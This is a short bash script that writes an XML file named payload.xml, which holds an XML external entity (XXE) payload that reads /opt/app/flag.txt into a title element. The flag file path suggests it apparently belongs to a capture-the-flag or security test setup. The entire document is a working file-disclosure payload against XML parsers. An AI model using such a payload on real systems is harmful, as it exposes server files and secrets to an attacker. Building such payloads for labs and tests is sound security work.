#!/bin/bash
set -e
OUT_DIR="${OUT_DIR:-/src}"
if ! mkdir -p "$OUT_DIR" 2>/dev/null; then OUT_DIR="."; fi
cat > "$OUT_DIR/payload.xml" <<'XML'
<!DOCTYPE note [<!ENTITY xxe SYSTEM "file:///opt/app/flag.txt">]><note><title>&xxe;</title></note>
XML
